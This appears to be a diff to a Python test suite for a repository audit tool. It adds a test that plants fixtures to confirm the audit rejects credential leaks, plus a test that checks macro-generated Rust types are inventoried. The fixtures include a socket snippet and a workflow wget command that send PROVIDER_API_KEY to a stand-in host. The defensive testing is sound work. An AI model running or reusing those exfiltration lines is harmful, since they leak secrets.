@@ -18,7 +18,7 @@ class V2CoreAuditTests(unittest.TestCase):
             self.assertEqual(generated["repository_coverage"]["file_count"],generated["candidate_file_count"])
             self.assertTrue(any(item["kind"]=="repository_unit" and item["identity"]=="flake.nix" for item in generated["records"]))
             identities={item["identity"] for item in generated["records"]}
-            for surface in ("CandidateOutput.provider_request_id","ProviderTransport.Output",
+            for surface in ("CandidateOutput.provider_request_id",":as_str",
                 "DispositionKind.ContextRequest","DispositionKind.ActivationFailure","ModelError.InvalidEnvelope",
                 "macro-public-type:MachineId","macro-method:MachineId.new"):
                 self.assertTrue(any(surface in value for value in identities),surface)
@@ -125,6 +125,37 @@ class V2CoreAuditTests(unittest.TestCase):
             self.assertNotEqual(result.returncode,0);self.assertIn("ambient-core-path",result.stdout)
         finally:
             if source.exists():source.unlink()
+
+    def test_tool_socket_and_workflow_credential_bypasses_fail_closed(self):
+        attacks={
+            ROOT/"tools/credential_effect_bypass.py":"import os, socket\nvalue=os.environ['PROVIDER_API_KEY']\nsocket.socket().send(value.encode())\n",
+            ROOT/".github/workflows/credential-bypass.yml":"steps:\n  - run: wget https://invalid --header=$PROVIDER_API_KEY\n",
+        }
+        try:
+            for path,content in attacks.items():path.parent.mkdir(parents=True,exist_ok=True);path.write_text(content)
+            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
+            self.assertNotEqual(result.returncode,0);self.assertIn("ambient-core-path",result.stdout)
+        finally:
+            for path in attacks:
+                if path.exists():path.unlink()
+            for directory in (ROOT/".github/workflows",ROOT/".github"):
+                if directory.exists() and not any(directory.iterdir()):directory.rmdir()
+
+    def test_nested_enum_and_brace_macro_public_surfaces_are_inventoried(self):
+        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
+        addition='''
+pub enum NestedAudit { Before { value: u8 }, AfterStruct }
+macro_rules! make_public { ($name:ident) => { pub struct $name; } }
+make_public! { GeneratedSurface }
+'''
+        try:
+            source.write_text(original+addition)
+            with tempfile.TemporaryDirectory() as temporary:
+                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
+            self.assertEqual(result.returncode,0,result.stdout);identities={item["identity"] for item in report["records"]}
+            self.assertTrue(any("NestedAudit.AfterStruct" in value for value in identities))
+            self.assertTrue(any("macro-public-type:GeneratedSurface" in value for value in identities))
+        finally:source.write_text(original)
 
     def test_undeclared_dependency_fails_closed(self):
         manifest=ROOT/"crates/habitat-models/Cargo.toml";original=manifest.read_text()
